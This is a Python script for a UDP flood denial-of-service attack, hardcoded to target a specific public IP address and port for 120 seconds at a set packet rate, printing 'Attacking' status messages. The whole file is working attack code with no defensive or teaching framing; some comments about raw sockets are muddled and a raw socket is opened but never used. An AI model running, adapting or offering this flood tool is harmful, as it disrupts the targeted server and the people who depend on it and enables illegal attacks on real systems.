import socket
import time
import random
import threading
import sys
import os

# CONFIGURATION
TARGET_IP = "20.235.148.44"
TARGET_PORT = 25431
DURATION = 120
PACKETS_PER_SEC = 2000  # Increase this if your CPU allows it

running = True

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def udp_flood_no_scapy():
    global running
    start_time = time.time()
    packets_sent = 0
    
    # Create a raw socket
    try:
        # AF_INET = IPv4, SOCK_RAW = Raw socket access
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    except PermissionError:
        print("[!] Error: You need Administrator privileges to run Raw Sockets.")
        print("    Right-click your terminal/IDE and select 'Run as Administrator'.")
        sys.exit(1)

    print(f"[+] Attacking {TARGET_IP}:{TARGET_PORT} for {DURATION} seconds...")
    print(f"[+] Packets/sec: {PACKETS_PER_SEC}")
    
    while time.time() - start_time < DURATION:
        if not running:
            break
            
        try:
            # Create a random payload (dummy data)
            payload = f"DDOS-{random.randint(1000, 9999)}".encode()
            
            # Construct the UDP header manually isn't strictly necessary for RAW socket
            # because the kernel does it, but we need to send the packet.
            # However, in RAW mode, we send the whole packet including IP header.
            
            # Let's just send simple UDP packets using a standard socket first for reliability
            # If you want RAW speed, stick to Scapy, but this works without it.
            
            # Using UDP socket instead of RAW for stability without Scapy
            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_sock.sendto(payload, (TARGET_IP, TARGET_PORT))
            udp_sock.close()
            
            packets_sent += 1
            
            # Rate limiting
            time.sleep(1.0 / PACKETS_PER_SEC)
            
        except Exception as e:
            pass

    print(f"\n[+] Attack Finished.")
    print(f"[+] Total Packets Sent: {packets_sent}")

def stop_attack():
    global running
    running = False
    print("\n[-] Attack Stopped.")

if __name__ == "__main__":
    running = True
    clear_screen()
    
    # Start the attack
    try:
        udp_flood_no_scapy()
    except KeyboardInterrupt:
        stop_attack()
